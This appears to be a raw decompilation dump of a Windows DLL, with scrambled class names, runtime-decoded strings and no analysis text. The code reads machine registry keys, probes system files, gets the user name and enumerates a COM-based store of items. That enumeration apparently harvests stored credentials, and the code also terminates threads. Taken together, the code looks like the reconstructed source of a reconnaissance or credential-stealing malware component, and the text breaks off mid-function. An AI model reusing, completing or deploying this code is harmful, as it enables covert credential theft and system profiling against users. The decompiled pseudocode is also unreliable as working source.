    LOBYTE(LastError) = sub_1000273E(**v1, (LPCSTR)(*v1)[1], (LPCSTR)(*v1)[2], v2 + 4, 128);
    if ( !(_BYTE)LastError )
    {
      LastError = GetLastError();
      *(_DWORD *)v2 = LastError;
    }
    ++v1;
    v2 += 132;
  }
  while ( (int)v1 < (int)&unk_100241DC );
  return LastError;
}
// 100241C0: using guessed type void *off_100241C0;

//----- (10002C4C) --------------------------------------------------------
int __thiscall sub_10002C4C(BYTE *this)
{
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  BYTE *v6; // [esp-8h] [ebp-32Ch]
  CHAR FileName[264]; // [esp+8h] [ebp-31Ch] BYREF
  CHAR pszPath[264]; // [esp+110h] [ebp-214h] BYREF
  CHAR Buffer[264]; // [esp+218h] [ebp-10Ch] BYREF

  v6 = this + 16;
  v2 = (const CHAR *)sub_1000C0E0(&unk_1001B668);
  if ( !sub_1000273E(HKEY_LOCAL_MACHINE, v2, 0, v6, 261) )
    *((_DWORD *)this + 3) = GetLastError();
  if ( GetWindowsDirectoryA(Buffer, 0x105u) )
  {
    _snprintf(pszPath, 0x104u, Buffer);
    v3 = (const CHAR *)sub_1000C0E0(&unk_1001B6CC);
    if ( PathAppendA(pszPath, v3) )
      *((_DWORD *)this + 70) = !sub_10002683(pszPath) + 1;
    _snprintf(FileName, 0x104u, Buffer);
    v4 = (const CHAR *)sub_1000C0E0(&unk_1001B6F0);
    if ( PathAppendA(FileName, v4) )
      *((_DWORD *)this + 71) = !sub_10002683(FileName) + 1;
  }
  return sub_10002C04(this);
}
// 10002C04: using guessed type int __thiscall sub_10002C04(_DWORD);
// 1000C0E0: using guessed type _DWORD __cdecl sub_1000C0E0(_DWORD);

//----- (10002D62) --------------------------------------------------------
int __thiscall sub_10002D62(_DWORD *this, int a2)
{
  int result; // eax

  result = a2;
  this[2] = a2;
  return result;
}

//----- (10002D6C) --------------------------------------------------------
_DWORD *__thiscall sub_10002D6C(_DWORD *this)
{
  this[2] = 0;
  this[1] = 7;
  *this = &QmghspgvhiXpvfsi::`vftable';
  memset(this + 3, 0, sizeof(_DWORD));
  return this;
}
// 1001B930: using guessed type void *QmghspgvhiXpvfsi::`vftable';

//----- (10002D94) --------------------------------------------------------
int sub_10002D94()
{
  return 4;
}

//----- (10002D98) --------------------------------------------------------
char __thiscall sub_10002D98(int this, void *a2, unsigned int a3)
{
  if ( a3 < 4 )
    return 0;
  memcpy(a2, (const void *)(this + 12), 4u);
  return 1;
}

//----- (10002DBA) --------------------------------------------------------
_DWORD *__thiscall sub_10002DBA(_DWORD *this)
{
  this[1] = 0;
  this[2] = 16;
  *this = &mm::data::List<void *>::`vftable';
  this[3] = operator new(0x40u);
  return this;
}
// 1001B95C: using guessed type void *mm::data::List<void *>::`vftable';

//----- (10002DE9) --------------------------------------------------------
void __thiscall sub_10002DE9(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-24h]

  v2 = (void *)this[3];
  *this = &mm::data::List<void *>::`vftable';
  j__free(v2);
  this[3] = 0;
}
// 1001B95C: using guessed type void *mm::data::List<void *>::`vftable';

//----- (10002E1A) --------------------------------------------------------
int __thiscall sub_10002E1A(_DWORD *this)
{
  return this[1];
}

//----- (10002E1E) --------------------------------------------------------
int __thiscall sub_10002E1E(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // ebx
  int v5; // eax
  unsigned int i; // eax
  int result; // eax

  if ( a3 != sub_10002E1A(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a3, &unk_1001B920);
  v4 = *this;
  v5 = sub_10002E1A(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 24))(this, v5 + 1);
  for ( i = sub_10002E1A(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = *a2;
  ++this[1];
  return result;
}

//----- (10002E7B) --------------------------------------------------------
int __thiscall sub_10002E7B(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi
  int result; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a2, &unk_1001B921);
  --this[1];
  while ( v2 < sub_10002E1A(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  result = sub_10002E1A(this);
  *(_DWORD *)(this[3] + 4 * result) = 0;
  return result;
}

//----- (10002EBD) --------------------------------------------------------
int __thiscall sub_10002EBD(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 52))(this, a2, &unk_1001B922);
  return this[3] + 4 * a2;
}

//----- (10002EDB) --------------------------------------------------------
int __thiscall sub_10002EDB(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 52))(this, a2, &unk_1001B923);
  return this[3] + 4 * a2;
}

//----- (10002EF9) --------------------------------------------------------
void __thiscall sub_10002EF9(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 60))(this, this[1], v2, a2);
    j__free(v2);
  }
}

//----- (10002F1B) --------------------------------------------------------
unsigned int __thiscall sub_10002F1B(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a2, &unk_1001B924);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 24))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 24))(a4, this[1] - a2);
  v5 = 0;
  result = sub_10002E1A(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 8))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 8))(a3, this[3] + 4 * v5);
      ++v5;
      result = sub_10002E1A(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10002F8D) --------------------------------------------------------
_DWORD *__thiscall sub_10002F8D(_DWORD *this)
{
  this[1] = 0;
  this[2] = 16;
  *this = &mm::data::List<UMwkodr *>::`vftable';
  this[3] = operator new(0x40u);
  return this;
}
// 1001B9A4: using guessed type void *mm::data::List<UMwkodr *>::`vftable';

//----- (10002FBC) --------------------------------------------------------
void __thiscall sub_10002FBC(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-24h]

  v2 = (void *)this[3];
  *this = &mm::data::List<UMwkodr *>::`vftable';
  j__free(v2);
  this[3] = 0;
}
// 1001B9A4: using guessed type void *mm::data::List<UMwkodr *>::`vftable';

//----- (10002FED) --------------------------------------------------------
int __thiscall sub_10002FED(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // ebx
  int v5; // eax
  unsigned int i; // eax
  int result; // eax

  if ( a3 != sub_10002E1A(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a3, &unk_1001B925);
  v4 = *this;
  v5 = sub_10002E1A(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 24))(this, v5 + 1);
  for ( i = sub_10002E1A(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = *a2;
  ++this[1];
  return result;
}

//----- (1000304A) --------------------------------------------------------
int __thiscall sub_1000304A(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi
  int result; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a2, &unk_1001B926);
  --this[1];
  while ( v2 < sub_10002E1A(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  result = sub_10002E1A(this);
  *(_DWORD *)(this[3] + 4 * result) = 0;
  return result;
}

//----- (1000308C) --------------------------------------------------------
int __thiscall sub_1000308C(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 52))(this, a2, &unk_1001B927);
  return this[3] + 4 * a2;
}

//----- (100030AA) --------------------------------------------------------
int __thiscall sub_100030AA(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 52))(this, a2, &unk_1001B928);
  return this[3] + 4 * a2;
}

//----- (100030C8) --------------------------------------------------------
int __thiscall sub_100030C8(void **this)
{
  void *v2; // edx

  j__free(this[3]);
  v2 = *this;
  this[2] = (void *)1;
  return (*((int (__thiscall **)(void **, _DWORD, _DWORD, int))v2 + 15))(this, 0, 0, 1);
}

//----- (100030E8) --------------------------------------------------------
unsigned int __thiscall sub_100030E8(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a2, &unk_1001B929);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 24))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 24))(a4, this[1] - a2);
  v5 = 0;
  result = sub_10002E1A(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 8))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 8))(a3, this[3] + 4 * v5);
      ++v5;
      result = sub_10002E1A(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1000315A) --------------------------------------------------------
unsigned int __thiscall sub_1000315A(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 56))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(4 * v5);
  this[1] = a2;
  v6 = 0;
  result = sub_10002E1A(this);
  if ( result )
  {
    do
    {
      *(_DWORD *)(this[3] + 4 * v6) = *(_DWORD *)(a3 + 4 * v6);
      ++v6;
      result = sub_10002E1A(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (100031B7) --------------------------------------------------------
_DWORD *__thiscall sub_100031B7(_DWORD *Block, char a2)
{
  sub_10002DE9(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100031D3) --------------------------------------------------------
_DWORD *__thiscall sub_100031D3(_DWORD *Block, char a2)
{
  sub_10002FBC(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100031EF) --------------------------------------------------------
unsigned int __thiscall sub_100031EF(_DWORD *this)
{
  unsigned int v2; // esi
  unsigned int result; // eax
  HANDLE *v4; // eax

  *this = &QmghspgvhiXpvfsi::`vftable';
  v2 = 0;
  result = sub_10002E1A(dword_10026C18);
  if ( result )
  {
    do
    {
      if ( *(_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(dword_10026C18[0] + 16))(dword_10026C18, v2) )
      {
        v4 = (HANDLE *)(*(int (__thiscall **)(int *, unsigned int))(dword_10026C18[0] + 16))(dword_10026C18, v2);
        CloseHandle(*v4);
      }
      ++v2;
      result = sub_10002E1A(dword_10026C18);
    }
    while ( v2 < result );
  }
  *this = &BVzrxdlmeb::`vftable';
  return result;
}
// 1001B638: using guessed type void *BVzrxdlmeb::`vftable';
// 1001B930: using guessed type void *QmghspgvhiXpvfsi::`vftable';
// 10026C18: using guessed type int dword_10026C18[4];

//----- (10003284) --------------------------------------------------------
unsigned int __thiscall sub_10003284(_DWORD *this)
{
  unsigned int result; // eax
  _DWORD *v2; // eax
  unsigned int v3; // [esp+10h] [ebp-14h]

  v3 = 0;
  this[3] = this[1];
  while ( 1 )
  {
    result = sub_10002E1A(dword_10026C28);
    if ( v3 >= result )
      break;
    if ( *(_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(dword_10026C28[0] + 16))(dword_10026C28, v3) )
    {
      v2 = (_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(dword_10026C28[0] + 16))(dword_10026C28, v3);
      (*(void (__thiscall **)(_DWORD))(*(_DWORD *)*v2 + 24))(*v2);
    }
    ++v3;
  }
  return result;
}
// 10026C28: using guessed type int dword_10026C28[4];

//----- (100032F1) --------------------------------------------------------
int __cdecl sub_100032F1(int a1)
{
  int result; // eax

  if ( a1 )
    return sub_10001CC2(dword_10026C28, (int)&a1);
  return result;
}
// 10026C28: using guessed type int dword_10026C28[4];

//----- (10003308) --------------------------------------------------------
_DWORD *__thiscall sub_10003308(_DWORD *Block, char a2)
{
  sub_100031EF(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10003324) --------------------------------------------------------
_DWORD *__thiscall sub_10003324(_DWORD *this, int a2)
{
  _DWORD *v3; // edi

  this[2] = 0;
  v3 = this + 3;
  this[1] = 14;
  *this = &TsjcbmKhqytf::`vftable';
  this[7] = a2;
  memset(this + 3, 0, 0x10u);
  *v3 = this[1];
  return this;
}
// 1001B9F4: using guessed type void *TsjcbmKhqytf::`vftable';

//----- (1000335C) --------------------------------------------------------
int __thiscall sub_1000335C(_DWORD *this)
{
  this[4] = 255;
  return sub_100032F1((int)this);
}

//----- (1000336B) --------------------------------------------------------
int sub_1000336B()
{
  return 16;
}

//----- (1000336F) --------------------------------------------------------
char __thiscall sub_1000336F(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0x10 )
    return 0;
  memcpy(a2, (const void *)(this + 12), 0x10u);
  return 1;
}

//----- (10003391) --------------------------------------------------------
void __thiscall sub_10003391(_DWORD *this)
{
  unsigned int v2; // ebx
  unsigned int v3; // edi
  unsigned int i; // edi
  HANDLE *v5; // eax
  HANDLE *v6; // eax
  DWORD v7; // [esp-4h] [ebp-2Ch]
  DWORD ExitCode; // [esp+10h] [ebp-18h] BYREF
  HANDLE *lpHandles; // [esp+14h] [ebp-14h]
  int v10; // [esp+24h] [ebp-4h]

  this[4] = 1;
  v2 = sub_10002E1A(dword_10026C18);
  v3 = 0;
  lpHandles = (HANDLE *)operator new(4 * v2);
  if ( lpHandles )
  {
    v10 = 0;
    while ( v3 < v2 )
    {
      lpHandles[v3] = *(HANDLE *)(*(int (__thiscall **)(int *, unsigned int))(dword_10026C18[0] + 16))(
                                   dword_10026C18,
                                   v3);
      ++v3;
    }
    v7 = this[7];
    this[5] = v2;
    this[4] = WaitForMultipleObjects(v2, lpHandles, 1, v7);
    for ( i = 0; i < v2; ++i )
    {
      v5 = (HANDLE *)(*(int (__thiscall **)(int *, unsigned int))(dword_10026C18[0] + 16))(dword_10026C18, i);
      if ( GetExitCodeThread(*v5, &ExitCode) && ExitCode == 259 )
      {
        v6 = (HANDLE *)(*(int (__thiscall **)(int *, unsigned int))(dword_10026C18[0] + 16))(dword_10026C18, i);
        TerminateThread(*v6, 0);
        if ( i < 0x20 )
          this[6] |= 1 << i;
      }
    }
    j__free(lpHandles);
  }
}
// 10026C18: using guessed type int dword_10026C18[4];

//----- (10003487) --------------------------------------------------------
_DWORD *__thiscall sub_10003487(_DWORD *this)
{
  _DWORD *v2; // edi

  v2 = this + 2;
  this[1] = 20;
  *this = &HodbmxrbZwanMespyfaho::`vftable';
  memset(this + 2, 0, 0x14u);
  *v2 = this[1];
  return this;
}
// 1001BB10: using guessed type void *HodbmxrbZwanMespyfaho::`vftable';

//----- (100034B0) --------------------------------------------------------
int sub_100034B0()
{
  return 20;
}

//----- (100034B4) --------------------------------------------------------
char __thiscall sub_100034B4(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0x14 )
    return 0;
  memcpy(a2, (const void *)(this + 8), 0x14u);
  return 1;
}

//----- (100034D6) --------------------------------------------------------
LSTATUS __thiscall sub_100034D6(int this)
{
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  LSTATUS result; // eax
  const CHAR *v5; // [esp-10h] [ebp-18h]
  const CHAR *v6; // [esp-10h] [ebp-18h]
  BYTE *v7; // [esp-Ch] [ebp-14h]

  v7 = (BYTE *)(this + 16);
  v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001BA18);
  v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001BA40);
  *(_DWORD *)(this + 12) = sub_100026CC(HKEY_LOCAL_MACHINE, v2, v5, v7, 4u, 0);
  v6 = (const CHAR *)sub_1000C0E0((int)&unk_1001BAB0);
  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001BAD0);
  result = sub_100026CC(HKEY_LOCAL_MACHINE, v3, v6, (LPBYTE)(this + 24), 4u, 0);
  *(_DWORD *)(this + 20) = result;
  return result;
}

//----- (1000353F) --------------------------------------------------------
HKEY __thiscall sub_1000353F(_DWORD *this)
{
  *this = &Njowlwxhnxti::`vftable';
  return sub_1000C47D(this);
}
// 1001BB60: using guessed type void *Njowlwxhnxti::`vftable';

//----- (10003566) --------------------------------------------------------
_DWORD *__thiscall sub_10003566(_DWORD *this, char a2)
{
  _DWORD *v3; // edi

  this[2] = 0;
  v3 = this + 11;
  this[1] = 21;
  *this = &VgasvinjIiyocpsrj::`vftable';
  *((_BYTE *)this + 80) = a2;
  memset(this + 11, 0, 0x24u);
  *v3 = this[1];
  return this;
}
// 1001BB68: using guessed type void *VgasvinjIiyocpsrj::`vftable';

//----- (1000359E) --------------------------------------------------------
int __thiscall sub_1000359E(_BYTE *this)
{
  return 4 * (this[80] == 0) + 32;
}

//----- (100035AE) --------------------------------------------------------
char __thiscall sub_100035AE(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0x24 )
    return 0;
  memcpy(a2, (const void *)(this + 44), 0x24u);
  return 1;
}

//----- (100035D0) --------------------------------------------------------
LPSTR __thiscall sub_100035D0(int this, int a2)
{
  LPSTR result; // eax
  DWORD pcbBuffer; // [esp+4h] [ebp-80h] BYREF
  CHAR Buffer[260]; // [esp+8h] [ebp-7Ch] BYREF

  pcbBuffer = 257;
  if ( GetUserNameA(Buffer, &pcbBuffer) )
    return lstrcpynA((LPSTR)(this + 52), Buffer, 20);
  result = (LPSTR)GetLastError();
  *(_DWORD *)(this + 48) = result;
  return result;
}

//----- (1000363A) --------------------------------------------------------
DWORD __thiscall sub_1000363A(int this)
{
  const CHAR *v2; // eax
  DWORD result; // eax
  unsigned __int8 v4; // [esp+13h] [ebp-964Dh] BYREF
  int v5[9605]; // [esp+14h] [ebp-964Ch] BYREF
  WCHAR WideCharStr[20]; // [esp+9628h] [ebp-38h] BYREF
  int v7; // [esp+965Ch] [ebp-4h]

  v4 = 0;
  sub_1000747A(v5, 0);
  memset(WideCharStr, 0, sizeof(WideCharStr));
  v7 = 0;
  if ( MultiByteToWideChar(0, 0, (LPCCH)(this + 52), -1, WideCharStr, 20) )
  {
    v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001BB24);
    result = sub_10008385(&word_10026BD4, WideCharStr, &v4, 0, v2);
    if ( !result )
    {
      result = v4;
      *(_BYTE *)(this + 73) = v4;
      return result;
    }
  }
  else
  {
    result = GetLastError();
  }
  *(_DWORD *)(this + 48) = result;
  return result;
}
// 1000363A: using guessed type int var_964C[9605];

//----- (10003707) --------------------------------------------------------
_DWORD *__thiscall sub_10003707(_DWORD *this)
{
  void **pExceptionObject; // [esp+4h] [ebp-4h] BYREF

  this[1] = 0;
  *this = &Njowlwxhnxti::`vftable';
  if ( !sub_1000C378(this) )
  {
    sub_1000D6BF(&pExceptionObject);
    pExceptionObject = &HhawtcrrygmjaYsismvZwhhawtcr::`vftable';
    _CxxThrowException(&pExceptionObject, &_TI2_AVHhawtcrrygmjaYsismvZwhhawtcr__);
  }
  return this;
}
// 1001BB58: using guessed type void *HhawtcrrygmjaYsismvZwhhawtcr::`vftable';
// 1001BB60: using guessed type void *Njowlwxhnxti::`vftable';

//----- (10003743) --------------------------------------------------------
_DWORD *__thiscall sub_10003743(_DWORD *Block, char a2)
{
  sub_1000353F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000375F) --------------------------------------------------------
_DWORD *__thiscall sub_1000375F(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  result = this;
  *this = &HhawtcrrygmjaYsismvZwhhawtcr::`vftable';
  return result;
}
// 1001BB58: using guessed type void *HhawtcrrygmjaYsismvZwhhawtcr::`vftable';

//----- (1000376A) --------------------------------------------------------
HKEY __thiscall sub_1000376A(void *this)
{
  const char *v2; // eax
  _DWORD v4[5]; // [esp+10h] [ebp-18h] BYREF
  int v5; // [esp+24h] [ebp-4h]

  v5 = 0;
  sub_10003707(v4);
  LOBYTE(v5) = 1;
  v2 = exception::what((exception *)v4);
  (*(void (__thiscall **)(void *, const char *))(*(_DWORD *)this + 36))(this, v2);
  LOBYTE(v5) = 0;
  return sub_1000353F(v4);
}
// 1000376A: using guessed type _DWORD var_18[5];

//----- (100037B0) --------------------------------------------------------
HKEY __thiscall sub_100037B0(void *this)
{
  const char *v2; // eax
  _DWORD v4[5]; // [esp+10h] [ebp-18h] BYREF
  int v5; // [esp+24h] [ebp-4h]

  v5 = 0;
  sub_10003707(v4);
  LOBYTE(v5) = 1;
  v2 = exception::what((exception *)v4);
  (*(void (__thiscall **)(void *, const char *))(*(_DWORD *)this + 40))(this, v2);
  LOBYTE(v5) = 0;
  return sub_1000353F(v4);
}
// 100037B0: using guessed type _DWORD var_18[5];

//----- (100037F6) --------------------------------------------------------
int __thiscall sub_100037F6(_DWORD *this, int a2)
{
  this[19] = -1;
  sub_100035D0((int)this, a2);
  return (*(int (__thiscall **)(_DWORD *))(*this + 32))(this);
}

//----- (10003811) --------------------------------------------------------
DWORD __thiscall sub_10003811(_DWORD *this, int a2)
{
  this[19] = 0;
  return sub_1000363A((int)this);
}

//----- (1000381D) --------------------------------------------------------
_DWORD *__thiscall sub_1000381D(_DWORD *this)
{
  _DWORD *v2; // edi

  v2 = this + 2;
  this[1] = 29;
  *this = &gqpgNqsqyUppxokcqx::`vftable';
  memset(this + 2, 0, 0xCu);
  *v2 = this[1];
  return this;
}
// 1001BD98: using guessed type void *gqpgNqsqyUppxokcqx::`vftable';

//----- (10003848) --------------------------------------------------------
int __thiscall sub_10003848(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 24))(this);
}

//----- (1000384D) --------------------------------------------------------
int sub_1000384D()
{
  return 12;
}

//----- (10003851) --------------------------------------------------------
char __thiscall sub_10003851(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0xC )
    return 0;
  memcpy(a2, (const void *)(this + 8), 0xCu);
  return 1;
}

//----- (10003873) --------------------------------------------------------
char __thiscall sub_10003873(int this, int a2)
{
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  const char *v5; // eax
  const char *v6; // eax
  size_t v7; // eax
  const CHAR *v8; // eax
  DWORD LastError; // eax
  DWORD v11; // [esp-4h] [ebp-90h]
  CHAR Dst[260]; // [esp+Ch] [ebp-80h] BYREF

  memset(Dst, 0, sizeof(Dst));
  *(_BYTE *)(this + 17) = 0;
  *(_BYTE *)(this + 18) = 0;
  *(_BYTE *)(this + 16) = 0;
  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001BB98);
  if ( !sub_10002698(HKEY_LOCAL_MACHINE, v3) )
    *(_BYTE *)(this + 17) = 1;
  v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001BBD4);
  if ( !sub_10002698(HKEY_LOCAL_MACHINE, v4) )
    *(_BYTE *)(this + 18) = 1;
  v5 = (const char *)sub_1000C0E0((int)&unk_1001BC00);
  if ( strlen(v5) >= 0x104 )
  {
    v7 = 260;
  }
  else
  {
    v6 = (const char *)sub_1000C0E0((int)&unk_1001BC88);
    v7 = strlen(v6);
  }
  v11 = v7;
  v8 = (const CHAR *)sub_1000C0E0((int)&unk_1001BD10);
  if ( ExpandEnvironmentStringsA(v8, Dst, v11) )
  {
    LOBYTE(LastError) = sub_10002683(Dst);
    *(_BYTE *)(this + 16) = LastError;
  }
  else
  {
    LastError = GetLastError();
    *(_DWORD *)(this + 12) = LastError;
  }
  return LastError;
}

//----- (1000396B) --------------------------------------------------------
HKEY __thiscall sub_1000396B(void *this)
{
  const char *v2; // eax
  _DWORD v4[5]; // [esp+10h] [ebp-18h] BYREF
  int v5; // [esp+24h] [ebp-4h]

  v5 = 0;
  sub_10003707(v4);
  LOBYTE(v5) = 1;
  v2 = exception::what((exception *)v4);
  (*(void (__thiscall **)(void *, const char *))(*(_DWORD *)this + 20))(this, v2);
  LOBYTE(v5) = 0;
  return sub_1000353F(v4);
}
// 1000396B: using guessed type _DWORD var_18[5];

//----- (100039B1) --------------------------------------------------------
_DWORD *__thiscall sub_100039B1(_DWORD *this)
{
  _DWORD *v2; // edi

  v2 = this + 2;
  this[1] = 28;
  *this = &JpenyjqcsLvbfbnaJpenyjqcs::`vftable';
  memset(this + 2, 0, 0x79E8u);
  *v2 = this[1];
  return this;
}
// 1001BE58: using guessed type void *JpenyjqcsLvbfbnaJpenyjqcs::`vftable';

//----- (100039DF) --------------------------------------------------------
int sub_100039DF()
{
  return 31208;
}

//----- (100039E5) --------------------------------------------------------
char __thiscall sub_100039E5(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0x79E8 )
    return 0;
  memcpy(a2, (const void *)(this + 8), 0x79E8u);
  return 1;
}

//----- (10003A0A) --------------------------------------------------------
char __stdcall sub_10003A0A(
        int *a1,
        int a2,
        int a3,
        const void *a4,
        wchar_t *Str,
        size_t *a6,
        int a7,
        void *a8,
        wchar_t *a9,
        void *a10)
{
  int v10; // eax
  const CHAR *v11; // eax
  size_t v12; // eax
  size_t v13; // eax
  const void *v15; // [esp-8h] [ebp-4Ch]
  LPVOID pv; // [esp+1Ch] [ebp-28h] BYREF
  unsigned int v17; // [esp+20h] [ebp-24h] BYREF
  char v18; // [esp+27h] [ebp-1Dh]
  WCHAR WideCharStr; // [esp+28h] [ebp-1Ch] BYREF
  int v20; // [esp+2Ah] [ebp-1Ah]
  int v21; // [esp+2Eh] [ebp-16h]
  int v22; // [esp+32h] [ebp-12h]
  int v23; // [esp+36h] [ebp-Eh]
  int v24; // [esp+3Ah] [ebp-Ah]
  __int16 v25; // [esp+3Eh] [ebp-6h]

  WideCharStr = 0;
  v20 = 0;
  v21 = 0;
  v22 = 0;
  pv = 0;
  v23 = 0;
  v24 = 0;
  v25 = 0;
  v10 = *a1;
  v17 = 70;
  v18 = 0;
  if ( !(*(int (__stdcall **)(int *, int, int, const void *, wchar_t *, unsigned int *, LPVOID *, _DWORD, int))(v10 + 68))(
          a1,
          a2,
          a3,
          a4,
          Str,
          &v17,
          &pv,
          0,
          a7)
    && v17 )
  {
    v11 = (const CHAR *)sub_1000C0E0((int)&unk_1001BDE0);
    if ( MultiByteToWideChar(0, 0, v11, -1, &WideCharStr, 13) && !wcsstr(Str, &WideCharStr) )
    {
      if ( wcslen(Str) >= 0x4B )
        v12 = 75;
      else
        v12 = wcslen(Str);
      wcsncpy(a9, Str, v12);
      v13 = 140;
      if ( v17 <= 0x8C )
        v13 = v17;
      v15 = pv;
      *a6 = v13;
      memcpy(a8, v15, v13);
      memcpy(a10, a4, 0x10u);
      v18 = 1;
    }
  }
  else
  {
    v18 = 0;
  }
  if ( pv )
    CoTaskMemFree(pv);
  return v18;
}
// 10003A0A: using guessed type unsigned int var_24;

//----- (10003B37) --------------------------------------------------------
int __thiscall sub_10003B37(_DWORD *this, int a2, int *a3)
{
  int v3; // esi
  int v4; // ecx
  int v5; // ecx
  int v6; // esi
  int result; // eax
  wchar_t *Str; // [esp+14h] [ebp-44h] BYREF
  int v9; // [esp+18h] [ebp-40h] BYREF
  int v10; // [esp+1Ch] [ebp-3Ch] BYREF
  int v11; // [esp+20h] [ebp-38h] BYREF
  _DWORD *v12; // [esp+24h] [ebp-34h]
  int v13; // [esp+28h] [ebp-30h] BYREF
  unsigned int v14; // [esp+2Ch] [ebp-2Ch]
  int v15; // [esp+30h] [ebp-28h] BYREF
  int v16[4]; // [esp+34h] [ebp-24h] BYREF
  int v17[4]; // [esp+44h] [ebp-14h] BYREF

  v3 = a2;
  memset(v17, 0, sizeof(v17));
  v12 = this;
  v14 = 0;
  v10 = 0;
  while ( 1 )
  {
    result = (*(int (__stdcall **)(int, int, int *, int *))(*(_DWORD *)v3 + 12))(v3, 1, v17, &v10);
    if ( result || !v10 )
      break;
    v4 = *a3;
    v15 = 0;
    if ( (*(int (__stdcall **)(int *, _DWORD, int *, _DWORD, int *))(v4 + 60))(a3, 0, v17, 0, &v15) )
    {
      if ( v15 )
        (*(void (__stdcall **)(int))(*(_DWORD *)v15 + 8))(v15);
      v12[3] = GetLastError();
    }
    else
    {
      memset(v16, 0, sizeof(v16));
      v9 = 0;
      while ( !(*(int (__stdcall **)(int, int, int *, int *))(*(_DWORD *)v15 + 12))(v15, 1, v16, &v9)
           && v9
           && v14 < 0x64 )
      {
        v5 = *a3;
        v13 = 0;
        if ( (*(int (__stdcall **)(int *, _DWORD, int *, int *, _DWORD, int *))(v5 + 84))(a3, 0, v17, v16, 0, &v13) )
        {
          v12[3] = GetLastError();
        }
        else
        {
          Str = 0;
          v11 = 0;
          if ( !(*(int (__stdcall **)(int, int, wchar_t **, int *))(*(_DWORD *)v13 + 12))(v13, 1, &Str, &v11) )
          {
            v6 = (int)&v12[78 * v14 + 4];
            do
            {
              if ( !v11 || v14 >= 0x64 )
                break;
              if ( sub_10003A0A(
                     a3,
                     0,
                     (int)v17,
                     v16,
                     Str,
                     (size_t *)(v6 + 152),
